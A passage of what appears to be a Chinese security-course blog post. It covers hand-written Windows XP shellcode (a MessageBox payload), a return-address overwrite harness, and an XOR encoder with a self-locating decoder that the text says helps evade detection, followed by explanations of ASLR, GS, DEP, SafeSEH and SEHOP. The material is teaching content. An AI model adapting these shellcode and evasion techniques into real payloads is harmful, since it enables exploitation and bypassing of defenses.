+<th>机器代码</th>
+<th>汇编指令</th>
+<th>注释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>33 DB</td>
+<td>XOR  EBX,EBX</td>
+<td>将EBX的值设置为0</td>
+</tr>
+<tr>
+<td>53</td>
+<td>PUSH  EBX</td>
+<td>将EBX的值入栈</td>
+</tr>
+<tr>
+<td>68 77 65 73 74</td>
+<td>PUSH  74736577</td>
+<td>将字符串west入栈</td>
+</tr>
+<tr>
+<td>68 77 65 73 74</td>
+<td>PUSH  74736577</td>
+<td>将字符串west入栈</td>
+</tr>
+<tr>
+<td>8B C4</td>
+<td>MOV  EAX,ESP</td>
+<td>将栈顶指针存入EAX（栈顶指针的值就是字符串的首地址）</td>
+</tr>
+<tr>
+<td>53</td>
+<td>PUSH   EBX</td>
+<td>入栈Messagebox的参数-类型</td>
+</tr>
+<tr>
+<td>50</td>
+<td>PUSH   EAX</td>
+<td>入栈Messagebox的参数-标题</td>
+</tr>
+<tr>
+<td>50</td>
+<td>PUSH   EAX</td>
+<td>入栈Messagebox的参数-消息</td>
+</tr>
+<tr>
+<td>53</td>
+<td>PUSH   EBX</td>
+<td>入栈Messagebox的参数-句柄</td>
+</tr>
+<tr>
+<td>B8 EA 07 D5 77</td>
+<td>MOV EAX, 0x77D507EA</td>
+<td></td>
+</tr>
+<tr>
+<td>FF D0</td>
+<td>CALL EAX</td>
+<td>调用MessageBoxA函数，注意，每个机器的该函数的入口地址不同，请<strong>按实际值写入</strong>。</td>
+</tr>
+</tbody></table>
+<p><strong>第三步：注入Shellcode代码</strong></p>
+<p>得到的shellcode为：33 DB 53 68 77 65 73 74 68 77 65 73 74 8B C4 53 50 50 53 B8 EA 07 D5 77 FF D0。<br>将这段shellcode写入reg.txt文件，且在返回地址处写buffer的地址。<br><code>Buffer的地址可以通过OllyDbg来查看得到，也可以通过VC6的转到反汇编方式来得到：0012FAF0。</code>用nop指令填充空余部分(ASCII值：90)</p>
+<p><img src="/2023/03/14/lou-dong-li-yong-pian/635c4861c2059e67bb283fa34dddf417.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/635c4861c2059e67bb283fa34dddf417.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>注意：Windows xp下静态 API 的地址是准的，windows XP之后的操作系统版本增加了<strong>ASLR 保护机制</strong>，地址就不准，就得<strong>动态获取</strong>了，利用地址定位技术或者通用型Shellcode编写可以解决这个问题。 </p>
+<h1 id="Shellcode编写"><a href="#Shellcode编写" class="headerlink" title="Shellcode编写"></a>Shellcode编写</h1><h2 id="Shellcode编写的难点"><a href="#Shellcode编写的难点" class="headerlink" title="Shellcode编写的难点"></a>Shellcode编写的难点</h2><p>由于漏洞发现者在漏洞发现之初并不会给出完整Shellcode，因此掌握Shellcode编写技术就显得尤为重要。但是，要编写Shellcode存在很多难点：</p>
+<ol>
+<li><strong>对一些特定字符需要转码</strong>。比如，对于strcpy等函数造成的缓冲区溢出，会认为NULL是字符串的终结，所以shellcode中不能有NULL，如果有需要则要进行变通或编码。</li>
+<li><strong>函数API的定位很困难</strong>。比如，在Windows系统下，系统调用多数都是封装在高级API中来调用的，而且不同的Service Pack或版本的操作系统其API都可能有所改动，所以不可能直接调用。因此，需要采用<strong>动态的方法获取API地址</strong>。</li>
+</ol>
+<h2 id="简单编写Shellcode的方法"><a href="#简单编写Shellcode的方法" class="headerlink" title="简单编写Shellcode的方法"></a>简单编写Shellcode的方法</h2><p>一种简单的编写Shellcode的方法的步骤如下：</p>
+<h3 id="第一步：用c语言书写要执行的Shellcode"><a href="#第一步：用c语言书写要执行的Shellcode" class="headerlink" title="第一步：用c语言书写要执行的Shellcode"></a>第一步：用c语言书写要执行的Shellcode</h3><p>使用VC6编写程序如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    MessageBox(NULL,NULL,NULL,0);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="第二步：换成对应的汇编代码"><a href="#第二步：换成对应的汇编代码" class="headerlink" title="第二步：换成对应的汇编代码"></a>第二步：换成对应的汇编代码</h3><p>利用调试功能，找到其对应的汇编代码：</p>
+<p><img src="/2023/03/14/lou-dong-li-yong-pian/a99f990d555c8fbbad47157005d5bf9a.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/a99f990d555c8fbbad47157005d5bf9a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><code>直接得到的汇编语言通常需要进行再加工。对于push 0而言，可以通过上述的xor ebx ebx之后执行push ebx来实现。</code></p>
+<p>在工程中编写汇编语言如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">    LoadLibrary(&quot;user32.dll&quot;);//加载user32.dll</span><br><span class="line">  _asm</span><br><span class="line">  &#123;</span><br><span class="line">      xor ebx,ebx</span><br><span class="line">      push ebx//push 0，push 0的机器代码会出现一个字节的0，对于直接利用需要解决字节为0的问题，因此转换为push ebx</span><br><span class="line">      push ebx</span><br><span class="line">      push ebx</span><br><span class="line">      push ebx</span><br><span class="line">    mov eax, 77d507eah// 77d507eah是MessageBox函数在系统中的地址</span><br><span class="line">      call eax</span><br><span class="line">  &#125;</span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="第三步：根据汇编代码，找到对应地址中的机器码"><a href="#第三步：根据汇编代码，找到对应地址中的机器码" class="headerlink" title="第三步：根据汇编代码，找到对应地址中的机器码"></a>第三步：根据汇编代码，找到对应地址中的机器码</h3><p>在汇编第一行代码处打断点，利用调试定位具体内存中的地址：</p>
+<p><img src="/2023/03/14/lou-dong-li-yong-pian/c58fa397f5aebffcee94d5abdd6a0ef1.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/c58fa397f5aebffcee94d5abdd6a0ef1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><code>这样，在Memory窗口就可以找到对应的机器码：33 DB 53 53 53 53 B8 EA 07 D5 77 FF D0。</code></p>
+<p>接下来就可以利用这个Shellcode来实现漏洞的利用了，一个VC6测试程序如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">char ourshellcode[]=&quot;\x33\xDB\x53\x53\x53\x53\xB8\xEA\x07\xD5\x77\xFF\xD0&quot;;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    LoadLibrary(&quot;user32.dll&quot;);</span><br><span class="line">    int *ret;</span><br><span class="line">    ret=(int*)&amp;ret+2;//指向返回地址</span><br><span class="line">    (*ret)=(int)ourshellcode;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="编写输出“hello-world”的Shellcode"><a href="#编写输出“hello-world”的Shellcode" class="headerlink" title="编写输出“hello world”的Shellcode"></a>编写输出“hello world”的Shellcode</h2><ul>
+<li>4字节存入，硬编码空格是0x20；不足4字节，可以在最后的字节里补空格。“hello world” ASCII码为：\x68\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x20。</li>
+<li>入栈的话，需要倒着来；考虑big endian编码，存储顺序也得倒过来。</li>
+</ul>
+<p>利用ESP来获取字符串的地址，编写的shellcode代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">    xor ebx,ebx</span><br><span class="line">    push ebx//push 0</span><br><span class="line">    push 20646C72h</span><br><span class="line">    push 6F77206Fh</span><br><span class="line">    push 6C6C6568h</span><br><span class="line">    mov eax, esp</span><br><span class="line">    </span><br><span class="line">    push ebx//push 0</span><br><span class="line">    push eax</span><br><span class="line">    push eax</span><br><span class="line">    push ebx</span><br><span class="line">  mov eax, 77d507eah// 77d507eah这个是MessageBox函数在系统中的地址</span><br><span class="line">    call eax</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提取到的 shellcode 代码为：<br>\x33\xDB\x53\x68\x72\x6C\x64\x20\x68\x6F\x20\x77\x6F\x68\x68\x65\x6C\x6C\x8B\xC4\x53\x50\x50\x53\xB8\xEA\x07\xD5\x77\xFF\xD0</p>
+<p>可以使用上述程序实验。</p>
+<h1 id="Shellcode编码"><a href="#Shellcode编码" class="headerlink" title="Shellcode编码"></a>Shellcode编码</h1><h2 id="Shellcode编码的必要性"><a href="#Shellcode编码的必要性" class="headerlink" title="Shellcode编码的必要性"></a>Shellcode编码的必要性</h2><p>Shellcode代码编制过程通常需要进行编码，因为：</p>
+<ul>
+<li><strong>字符集的差异</strong>。应用程序应用平台的不同，可能的字符集会有差异，限制exploit的稳定性。</li>
+<li><strong>绕过坏字符</strong>。针对某个应用，可能对某些“坏字符”变形或者截断而破坏exploit，比如strcpy函数对NULL字符的不可接纳性，再比如很多应用在某些处理流程中可能会限制0x0D（\r）、0x0A（\n）或者0x20（空格）字符。</li>
+<li><strong>绕过安全防护检测</strong>。有很多安全检测工具是根据漏洞相应的exploit脚本特征做的检测，所以变形exploit在一定程度上可以“免杀”。</li>
+</ul>
+<h2 id="Shellcode编码方法"><a href="#Shellcode编码方法" class="headerlink" title="Shellcode编码方法"></a>Shellcode编码方法</h2><p><strong>网页Shellcode</strong>。对于网页Shellcode，可以采用<strong>base64编码</strong>。Base64是网络上最常见的用于传输8Bit字节码的编码方式之一，是一种基于64个可打印字符来表示二进制数据的方法。<br><strong>二进制机器代码</strong>。对于二进制Shellcode机器代码的编码，通常采用类似“<strong>加壳</strong>”思想的手段，采用：</p>
+<ol>
+<li><strong>自定义编码</strong>(异或编码、计算编码、简单加解密等)的方法完成shellcode的编码；</li>
+<li>通过精心构造<strong>精简干练的解码程序</strong>，放在shellcode开始执行的地方，完成shellcode的<strong>编解码</strong>；当exploit成功时，shellcode顶端的<u>解码程序首先运行</u>，它会<u>在内存中将真正的shellcode还原成原来的样子</u>，然后执行。</li>
+</ol>
+<br/>
+
+<h3 id="异或编码"><a href="#异或编码" class="headerlink" title="异或编码"></a>异或编码</h3><p>异或编码是一种简单易用的shellcode编码方法，它的编解码程序非常简单。<br>但是它也存在很多限制，比如在选取编码字节时，不可与已有字节相同，否则会出现0。</p>
+<h4 id="编码程序"><a href="#编码程序" class="headerlink" title="编码程序"></a>编码程序</h4><p><strong>编码程序，是独立的</strong>。是在生成shellcode的编码阶段使用。将shellcode代码输入后，输出异或后的shellcode编码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void encoder(char* input, unsigned char key)</span><br><span class="line">&#123;</span><br><span class="line">    int i = 0, len = 0;     </span><br><span class="line">    len = strlen(input);</span><br><span class="line">    unsigned char * output =  (unsigned char *)malloc(len + 1);        </span><br><span class="line">    for (i = 0; i&lt;len; i++)</span><br><span class="line">        output[i] = input[i] ^ key; </span><br><span class="line">    ……输出到文件中….</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    char sc[]=“0xAE………………………0x90”;</span><br><span class="line">    encoder(sc, 0x44);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="解码程序"><a href="#解码程序" class="headerlink" title="解码程序"></a>解码程序</h4><p><strong>解码程序是shellcode的一部分</strong>。下面的解码程序中，<u>默认EAX在shellcode开始时对准shellcode起始位置</u>，程序将每次将shellcode的代码异或特定key（0x44）后重新覆盖原先shellcode的代码。末尾，放一个空指令0x90作为结束符。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      add eax, 0x14 ;  越过decoder，假设eax对准当前这条指令的地址</span><br><span class="line">      xor ecx, ecx</span><br><span class="line">    decode_loop:</span><br><span class="line">      mov bl, [eax + ecx]</span><br><span class="line">      xor bl, 0x44             ;用0x44作为key</span><br><span class="line">      mov [eax + ecx], bl</span><br><span class="line">      inc ecx</span><br><span class="line">      cmp bl, 0x90             ;末尾放一个0x90作为结束符</span><br><span class="line">      jne decode_loop</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取代码当前指令地址"><a href="#获取代码当前指令地址" class="headerlink" title="获取代码当前指令地址"></a>获取代码当前指令地址</h4><p>怎么让eax记录shellcode当前的起始地址？看如下代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main(int argc, char const *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int temp;    </span><br><span class="line">    __asm&#123;</span><br><span class="line">        call lable;</span><br><span class="line">      lable:</span><br><span class="line">        pop eax;</span><br><span class="line">        mov temp,eax;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt;temp &lt;&lt;endl;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">//Call会执行push EIP；EIP的值又是下一条指令pop EAX的地址</span><br><span class="line">//Pop Eax会将栈顶EIP（自身指令地址）出栈，保存到EAX中</span><br></pre></td></tr></table></figure>
+
+<p>核心语句在于<code>“call lable; lable: pop eax;”</code>之后，eax 的值就是当前指令地址了。<br>原因是<code>call lable</code>的时候，会将当前 EIP 的值（也就是下一条指令 pop eax 的指令地址）入栈。</p>
+<p>因此，我们通过下面的程序来产生含有解码程序的 Shellcode：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int main()&#123;</span><br><span class="line">   __asm  &#123;</span><br><span class="line">     call lable; </span><br><span class="line">    lable: pop eax; </span><br><span class="line">     //EAX指向pop eax地址0x14-&gt;0X15</span><br><span class="line">        add eax, 0x15            ;越过decoder记录shellcode起始地址</span><br><span class="line">        xor ecx, ecx</span><br><span class="line">    decode_loop:</span><br><span class="line">        mov bl, [eax + ecx]</span><br><span class="line">        xor bl, 0x44             ;用0x44作为key</span><br><span class="line">        mov [eax + ecx], bl</span><br><span class="line">        inc ecx</span><br><span class="line">        cmp bl, 0x90             ;末尾放一个0x90作为结束符</span><br><span class="line">        jne decode_loop </span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提取到的机器码是”\xE8\x00\x00\x00\x00\x58\x83\xC0\x15\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x90\x75\xF1”</p>
+<h4 id="完整的shellcode代码"><a href="#完整的shellcode代码" class="headerlink" title="完整的shellcode代码"></a>完整的shellcode代码</h4><p>后面跟上任意的编码后的shellcode形成完整的可利用的shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">char ourshellcode[]=&quot;\xE8\x00\x00\x00\x00\x58\x83\xC0\x15\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x90\x75\xF1\x77\x9f\x17\x2c\x36\x28\x20\x64\x2c\x2b\x64\x33\x2b\x2c\x2c\x21\x28\x28\xcf\x80\x17\x14\x14\x17\xfc\xae\x43\x91\x33\xbb\x94\xd4&quot;;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    LoadLibrary(&quot;user32.dll&quot;);</span><br><span class="line">    int *ret;</span><br><span class="line">    ret=(int*)&amp;ret+2;</span><br><span class="line">    (*ret)=(int)ourshellcode;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Windows安全防护技术"><a href="#Windows安全防护技术" class="headerlink" title="Windows安全防护技术"></a>Windows安全防护技术</h1><p>由于C、C++等高级程序语言在<strong>边界检查方面存在的不足</strong>，致使缓冲区溢出漏洞等多种软件漏洞已成为信息系统安全的主要威胁之一，尤其对于使用广泛的Windows操作系统及其应用程序造成了极大的危害。为了能在操作系统层面提供对软件漏洞的防范，Windows操作系统自Vista版本开始，到现在普遍采用的Windows7/8/10等版本，陆续提供了多种防范措施和手段，对于提高Windows操作系统抵御漏洞攻击起到了关键作用。</p>
+<p>下面介绍Windows操作系统中提供的主要几种软件漏洞利用的防范技术。</p>
+<h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>**地址空间分布随机化ASLR(addressspace layout randomization)**是一项通过将<u>系统关键地址随机化</u>，&lt;从而使攻击者无法获得需要跳转的精确地址的技术。</p>
+<p><strong>Shellcode需要调用一些系统函数才能实现系统功能达到攻击目的</strong>，因为这些函数的地址往往是系统DLL（如kernel32. Dll）、可执行文件本身、栈数据或PEB（Process Environment Block，进程环境块）中的<strong>固定调用地址</strong>，所以为shellcode的调用提供了方便。</p>
+<p>对于ASLR技术，微软从<strong>操作系统加载时的地址变化</strong>和<strong>可执行程序编译时的编译器选项</strong>两个方面进行了实现和完善。</p>
+<h3 id="系统加载地址变化"><a href="#系统加载地址变化" class="headerlink" title="系统加载地址变化"></a>系统加载地址变化</h3><ul>
+<li>ASLR随机化的关键系统地址包括: <strong>PE文件(exe文件和dll文件)映像加载地址</strong>、<strong>堆栈基址</strong>、<strong>堆地址</strong>、<strong>PEB和TEB（Thread Environment Block，线程环境块）地址</strong>等。</li>
+<li>在Windows Vista上，当程序启动将执行文件加载到内存时，操作系统通过内核模块提供的ASLR功能，在原来映像基址的基础上加上一个<strong>随机数</strong>作为新的映像基址。</li>
+<li>随机数的取值范围限定为1至254，并保证每个数值随机出现。</li>
+</ul>
+<h3 id="编译器选项-DYNAMICBASE"><a href="#编译器选项-DYNAMICBASE" class="headerlink" title="编译器选项-DYNAMICBASE"></a>编译器选项-DYNAMICBASE</h3><p>VS 2005及更高版本提供了选项/DYNAMICBASE，使用了该选项之后，编译后的程序每次运行时，其内部的栈等结构的地址都会被随机化。</p>
+<h3 id="查看地址变化情况"><a href="#查看地址变化情况" class="headerlink" title="查看地址变化情况"></a>查看地址变化情况</h3><p>实验四：在Windows 7及以后的操作系统里运行下述程序，查看地址变化情况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#define DLL_NAME &quot;kernel32.dll&quot;</span><br><span class="line">unsigned long gvar = 0;</span><br><span class="line">void PrintAddress() &#123;</span><br><span class="line">    printf(&quot;PrintAddress的地址:%p \n&quot;, PrintAddress);</span><br><span class="line">    gvar++;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;  </span><br><span class="line">    HINSTANCE handle;</span><br><span class="line">    handle = LoadLibrary(DLL_NAME);</span><br><span class="line">    if (!handle) &#123;</span><br><span class="line">       printf(&quot; load dll erro !&quot;);  exit(0);</span><br><span class="line">    &#125; </span><br><span class="line">    printf(&quot;Kernel32.dll文件库的地址： 0x%x\n&quot;, handle);</span><br><span class="line">    void *pvAddress = GetProcAddress(handle, &quot;LoadLibraryW&quot;);</span><br><span class="line">    printf(&quot;LoadLibrary函数地址：%p \n&quot;, pvAddress);</span><br><span class="line">    PrintAddress();</span><br><span class="line">    printf(&quot;变量gvar的地址：%p \n&quot;, &amp;gvar);</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>GetProcAddress函数可以获得DLL中的函数地址</code></p>
+<h2 id="GS-Stack-protection"><a href="#GS-Stack-protection" class="headerlink" title="GS Stack protection"></a>GS Stack protection</h2><p>GS Stack Protection技术是一项缓冲区溢出的检测防护技术。VC++编译器中提供了一个/GS编译选项，在使用VC7.0、Visual Studio 2005及后续版本编译时都支持该选项，如选择该选项，<strong>编译器针对函数调用和返回时添加保护和检查功能的代码，在函数被调用时，在缓冲区和函数返回地址增加一个32位的随机数</strong>security_cookie，在函数返回时，调用检查函数检查security_cookie的值是否有变化。</p>
+<p><img src="/2023/03/14/lou-dong-li-yong-pian/d979a332b8a3b0c49b7a9371f7448927.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/d979a332b8a3b0c49b7a9371f7448927.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<ul>
+<li>security_cookie在进程启动时</li>
+</ul>
+<p><code>security_cookie</code>在进程启动时会随机产生，并且<strong>它的原始存储地址因Windows操作系统的ASLR机制也是随机存放的</strong>，攻击者无法对security_cookie进行篡改。</p>
+<ul>
+<li>当发生栈缓冲区溢出攻击时</li>
+</ul>
+<p>当发生栈缓冲区溢出攻击时，对返回地址或其他指针进行覆盖的同时，会覆盖security_cookie的值，因此在函数调用结束返回时，对security_cookie进行检查就会发现它的值变化了，从而发现缓冲区溢出的操作。</p>
+<p><font color=red>GS技术对基于栈的缓冲区溢出攻击能起到很好的防范作用。</font></p>
+<h2 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h2><p>**数据执行保护DEP(data execute prevention)**技术可以限制内存堆栈区的代码为不可执行状态，从而防范溢出后代码的执行。</p>
+<p>Windows操作系统中，默认情况下将包含执行代码和DLL文件的.text段即代码段的内存区域设置为可执行代码的内存区域。其他的内存区域不包含执行代码，应该不能具有代码执行权限，但是<strong>Windows XP及其之前的操作系统，没有对这些内存区域的代码执行进行限制</strong>。因此，对于缓冲区溢出攻击，攻击者能够对内存的堆栈或堆的缓冲区进行覆盖操作，并执行写入的shellcode代码。</p>
+<p>启用DEP机制后，DEP机制将这些敏感区域设置不可执行的<strong>non-executable标志位</strong>，因此在溢出后即使跳转到恶意代码的地址，恶意代码也将无法运行，从而有效地阻止了缓冲区溢出攻击的执行。</p>
+<p>DEP分为<strong>软件DEP和硬件DEP</strong>。硬件DEP需要CPU的支持,需要CPU在<strong>页表</strong>增加一个保护位NX(no execute)，来控制页面是否可执行。现在CPU一般都支持硬件NX，所以现在的DEP保护机制一般都采用的硬件DEP，对于DEP设置non-executable标志位的内存区域，CPU会添加NX保护位来控制内存区域的代码执行。</p>
+<p>此外，Visual Studio编译器提供了一个链接标志/NXCOMPAT，可以在生成目标应用程序的时候使程序启用DEP保护。</p>
+<h2 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h2><h3 id="回顾SEH"><a href="#回顾SEH" class="headerlink" title="回顾SEH"></a>回顾SEH</h3><p><strong>SEH（Structured Exception Handler）</strong>是Windows异常处理机制所采用的重要数据结构链表。程序设计者可以根据自身需要，定义程序发生各种异常时相应的处理函数，保存在SEH中。</p>
+<p>通过精心构造，攻击者通过<strong>缓冲区溢出覆盖</strong>SEH中异常处理函数句柄，将其替换为指向恶意代码shellcode的地址，并触发相应异常，从而使程序流程转向执行恶意代码。</p>
+<h3 id="SafeSEH-1"><a href="#SafeSEH-1" class="headerlink" title="SafeSEH"></a>SafeSEH</h3><p>SafeSEH就是一项保护SEH函数不被非法利用的技术。<strong>微软在编译器中加入了/SafeSEH选项</strong>，采用该选项编译的程序将PE文件中所有合法的SEH异常处理函数的地址解析出来制成一张<strong>SEH函数表</strong>，放在PE文件的数据块中,用于异常处理时候进行匹配检查。</p>
+<p>在该PE文件被加载时，系统读出该SEH函数表的地址，使用内存中的一个随机数加密，将<strong>加密后的SEH函数表</strong>地址、模块的基址、模块的大小、合法SEH函数的个数等信息，放入<strong>ntdll.dll的SEHIndex结构中</strong>。</p>
+<p>在PE文件运行中，如果需要调用异常处理函数，系统会调用加解密函数解密从而获得SEH函数表地址，然后<u>针对程序的每个异常处理函数检查是否在合法的SEH函数表中</u>，如果没有则说明该函数非法，将终止异常处理。<u>接着要检查异常处理句柄是否在栈上，如果在栈上也将停止异常处理</u>。这两个检测可以防止在堆上伪造异常链和把shellcode放置在栈上的情况，最后还要检测异常处理函数句柄的有效性。</p>
+<blockquote>
+<p>从Vista开始，由于系统PE文件在编译时都采用SafeSEH编译选项，因此以前那种通过覆盖异常处理句柄的漏洞利用技术，也就不能正常使用了。</p>
+</blockquote>
+<h2 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h2><p><strong>结构化异常处理覆盖保护SEHOP（Structured Exception Handler Overwrite Protection）</strong>是微软针对SEH攻击提出的一种安全防护方案。</p>
+<p>SEH攻击是指通过栈溢出或者其他漏洞，使用精心构造的数据覆盖SEH上面的某个函数或者多个函数，从而控制EIP（控制程序执行流程）。</p>
+<p><strong>SEHOP的核心是检测程序栈中的所有SEH结构链表的完整性</strong>，来判断应用程序是否受到了SEH攻击。</p>
+<p>SEHOP针对下列条件进行检测，包括：</p>
+<ul>
+<li>SEH结构都必须在栈上，最后一个SEH结构也必须在栈上；</li>
+<li>所有的SEH结构都必须是4字节对齐的；</li>
+<li>SEH结构中异常处理函数的句柄handle（即处理函数地址）必须不在栈上；</li>
+<li>最后一个SEH结构的handle必须是ntdll!FinalExceptionHandler函数F等。</li>
+</ul>
+<hr>
+<blockquote>
+<p>需要说明的是，虽然微软启用了GS、DEP、ASLR、SafeSEH、SEHOP等漏洞利用的防护技术，然而攻击者也在陆续发现着其他的漏洞利用手段，突破微软的防护技术。用魔高一尺道高一丈来描述两者间在漏洞利用技术上的对抗，一点也不为过。</p>
+<p>接下来，介绍一些进一步的漏洞利用技术。</p>
+</blockquote>
+<h1 id="地址定位技术"><a href="#地址定位技术" class="headerlink" title="地址定位技术"></a>地址定位技术</h1><p>根据软件漏洞触发条件的不同，内存给调用函数分配内存的方式不同，shellcode的植入地址也不相同。下面根据shellcode代码不同的定位方式，介绍三种漏洞利用技术。</p>
